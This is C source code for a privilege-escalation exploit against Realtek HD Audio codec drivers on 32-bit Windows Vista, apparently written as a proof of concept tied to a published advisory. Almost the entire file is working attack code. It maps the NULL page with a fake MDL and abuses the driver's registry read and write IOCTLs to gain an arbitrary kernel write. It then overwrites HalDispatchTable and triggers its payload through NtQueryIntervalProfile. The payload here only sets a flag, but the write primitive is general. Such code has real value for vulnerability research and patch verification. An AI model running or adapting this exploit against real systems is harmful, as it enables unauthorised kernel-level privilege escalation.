///////////////////////////////////////////////////////
///////////////////////////////////////////////////////
////	
////	Realtek HC Audio Codec Drivers
////	Privilege Escalation Exploit Vista 32-bit
////    
////	Ruben Santamarta 
////	www.reversemode.com

////
//// ------------------------------------------------------------
//// Buffer Layout
//// |  0  | + 0x0      ; TotalSize 
//// |  1  | + 0x4		; KeyNameOffset    
//// |  2  | + 0x8      ; DataBufferSize
//// |  3  | + 0xC		; ValueNameOffset  
//// |  4  | + 0x10		; BaseGlobalBuffer  
//// |  5  | + 0x14     ; DataType 
//// |  6  | + 0x18     ; DestBufferOffset  
//// |  7  | + 0x1C		; PoolSize - Datasize

#include "stdafx.h"

#define READ_KEY		0x222006
#define WRITE_KEY		0x222002

#define IMAGEBASE		0x400000

#define KEYNAME			0x50
#define VALUENAME		0x100
#define BUFFERSIZE		0x300
#define DESTBUFFER		0x200

#define REGKEY	"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\BITS"
#define VALUEKEY "StateIndex"

BOOL FlagVulnerable = FALSE;

typedef enum _KPROFILE_SOURCE {


    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum

} KPROFILE_SOURCE, *PKPROFILE_SOURCE;

typedef DWORD (WINAPI *PNTQUERYINTERVAL)(  KPROFILE_SOURCE ProfileSource,
										   PULONG          Interval );

typedef NTSTATUS (WINAPI *PNTALLOCATE)(	IN HANDLE               ProcessHandle,
										IN OUT PVOID            *BaseAddress,
										IN ULONG                ZeroBits,
										IN OUT PULONG           RegionSize,
										IN ULONG                AllocationType,
										IN ULONG                Protect );

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
    return TRUE;
}


_declspec(naked) int ShellCode()
{
	_asm{
		mov FlagVulnerable,1
		mov eax,0xC0000138
		retn 0x10
	}
}


 int Callback_Overview()
{
	printf("\n");
	printf("=================================================	\n");
	printf("   Realtek		\n");
	printf("   HD Audio Codecs Privilege Escalation Exploit	\n");
	printf("   Windows Vista\n");
	printf("=================================================	\n");
	printf("+ References:\n");
	printf("  www.realtek.com.tw\n");
	printf("  www.wintercore.com/advisories/advisory_W010408.html\n");
	printf("  kartoffel.reversemode.com\n\n");
	return 1;
}

wchar_t* Ansi2Wide(char *szIn) 
{
	int len = MultiByteToWideChar(CP_ACP,
									0,
									szIn,
									-1,
									NULL,
									0);

	wchar_t *tmpBuf = new wchar_t[len];

	MultiByteToWideChar(CP_ACP,
						0,
						szIn,
						-1,
						tmpBuf,
						len);


	return tmpBuf;
}
int Callback_Direct( char *lpInitStr )
{
	PNTQUERYINTERVAL	NtQueryIntervalProfile;
	PNTALLOCATE        NtAllocateVirtualMemory;
	KPROFILE_SOURCE	stProfile = ProfileTotalIssues;
	ULONG_PTR	origValue;
	HMODULE		hNTdll;

	LPVOID		pKern = NULL, addr = (LPVOID)3;
	
	DWORD		dwShellSize = 0x1000;

	wchar_t*	wKey = NULL;
	wchar_t*	wValue = NULL;
	
	char		szNtos[MAX_PATH] = {0};

	ULONG_PTR   xHalQuerySystemInformation;
	ULONG_PTR	HalDispatchTable;
	ULONG_PTR	HalOffset2;
	ULONG_PTR	HalOffset3;
	ULONG_PTR	BaseNt=0;
	ULONG_PTR	result;
	ULONG_PTR	addr2overwrite;
	ULONG_PTR	inBuff[BUFFERSIZE] = {0}; 
	
	HANDLE		hDevice;
	HMODULE		hKernel;

	int			status=0;
	int			i=0;
	


	Callback_Overview();

	hNTdll = GetModuleHandle( "ntdll.dll" );
 
	if( GetDriverInfoByName("krnl",szNtos,&BaseNt) )
	{
		printf("[+] %s loaded at   \t [ 0x%p ]\n",szNtos,BaseNt);
		
	}else {
		printf("[!!] Kernel not found :?\n");
		return FALSE;
	}

	if( strstr(szNtos,"krnlpa") )
	{
		hKernel = LoadLibraryExA("ntkrnlpa.exe",0,1);	
	}else {
		hKernel = LoadLibraryExA("ntoskrnl.exe",0,1);
	}	

	HalDispatchTable = (ULONG_PTR) GetProcAddress(hKernel, "HalDispatchTable");

	if( !HalDispatchTable )
	{
		printf("[!!] HalDispatchTable not found\n");
		return FALSE;
	}

	xHalQuerySystemInformation = *(ULONG_PTR*)(HalDispatchTable + sizeof(ULONG_PTR));
	xHalQuerySystemInformation -= IMAGEBASE;
	xHalQuerySystemInformation += BaseNt;

	HalDispatchTable -= ( ULONG_PTR )hKernel;
	HalDispatchTable += BaseNt;

	printf("[+] HalDispatchTable found    \t\t\t [ 0x%p ]\n",HalDispatchTable);
	printf("[+] xHalQuerySystemInformation()  \t\t [ 0x%p ]\n",xHalQuerySystemInformation);
	printf("[+] NtQueryIntervalProfile ");

	NtQueryIntervalProfile = ( PNTQUERYINTERVAL ) GetProcAddress(hNTdll,
																 "NtQueryIntervalProfile");
	if( !NtQueryIntervalProfile )
	{
		printf("[!!] Unable to resolve NtQueryIntervalProfile\n");
		return FALSE;
	}

	printf("\t\t\t [ 0x%p ]\n",NtQueryIntervalProfile ); 

	printf("[+] NtAllocateVirtualMemory");
	NtAllocateVirtualMemory = (PNTALLOCATE) GetProcAddress(hNTdll,"NtAllocateVirtualMemory");
	
	if( !NtAllocateVirtualMemory )
	{
		printf("[!!] Unable to resolve NtAllocateVirtualMemory\n");
		return FALSE;
	}

	printf( "\t\t\t [ 0x%p ]\n",NtAllocateVirtualMemory );

	printf("\n[+] Allocating memory at [ 0x%p ]...",NULL);

	status = NtAllocateVirtualMemory(	INVALID_HANDLE_VALUE, 
										&addr, 
										0,
										&dwShellSize,
										MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, 
										PAGE_EXECUTE_READWRITE );

	if( (ULONG_PTR)addr )
	{
		printf("[*] Error allocating memory\n");
		return 0;
	}
	printf("OK");

	// Fake MDL
	*( ULONG_PTR* )(( ULONG_PTR )addr + sizeof(ULONG_PTR) ) = 0x05050505;
	*( ULONG_PTR* )(( ULONG_PTR )addr + sizeof(ULONG_PTR)*3 ) = (ULONG_PTR)inBuff;
	
	printf("\n[+] Checking device...");
	// Topology GUID
	hDevice = OpenDevice(L"GUID:6994ad04-93ef-11d0-a3cc-00a0c9223196",
						FALSE,
						FALSE,
						FALSE,
						0,
						0);

	if( hDevice == INVALID_HANDLE_VALUE )
	{ 
		printf("\n\n[::] Error: Device not found!\n\n");
		return FALSE;
	}


	wKey = Ansi2Wide( REGKEY );
	wValue = Ansi2Wide( VALUEKEY);
	printf("[+] Reading Registry Key via vulnerable driver: \\%ws\\%ws\n",wKey,wValue);

	//////// #1 READ ORIGINAL VALUE
	inBuff[0] = 0x1600;       // high value
	inBuff[1] = KEYNAME;
	inBuff[2] = 0x100;
	inBuff[3] = VALUENAME;
	inBuff[4] = 0x10;
	inBuff[5] = NULL;
	inBuff[6] = DESTBUFFER;
	inBuff[7] = 0x40;
	
	wcscpy(( wchar_t* )( ( ULONG_PTR )inBuff + KEYNAME ), wKey);
	wcscpy(( wchar_t* )( ( ULONG_PTR )inBuff + VALUENAME ), wValue);
	
	DeviceIoControl( hDevice, READ_KEY, NULL, 0, NULL, 0, (DWORD*)&i, NULL);
	

	//////// #2 WRITE DESIRED VALUE

	wValue = Ansi2Wide( "ExploitAddress" );
	wcscpy(( wchar_t* )( ( ULONG_PTR )inBuff + VALUENAME ), wValue);
	
	origValue = *( ULONG_PTR* )(( ULONG_PTR )addr + DESTBUFFER );
	*( ULONG_PTR* )(( ULONG_PTR )inBuff + DESTBUFFER ) = (ULONG_PTR)ShellCode;
	inBuff[7] = sizeof(ULONG_PTR);
	
	printf("[+] Writing Registry Key via vulnerable driver: \\%ws\\%ws\n",wKey,wValue);
	DeviceIoControl( hDevice, WRITE_KEY, NULL, 0, NULL, 0, (DWORD*)&i, NULL);
	
	
	/////// #3 OVERWRITING HalDispatchTable
	
	addr2overwrite = 	HalDispatchTable
						+ sizeof(ULONG_PTR)
						- (ULONG_PTR)inBuff;
	
	inBuff[6] = addr2overwrite;
	
	DeviceIoControl( hDevice, READ_KEY, NULL, 0, NULL, 0, (DWORD*)&i, NULL);


	/////// #4 EXECUTING SHELLCODE

	NtQueryIntervalProfile(stProfile,&result);
	
	if(FlagVulnerable)
		printf("[+] Vulnerable!!\n");
	else
		printf("[+] Nothing found!!\n");

	printf("\n[+] Exiting...\n");
	CloseHandle(hDevice);

	return status;
}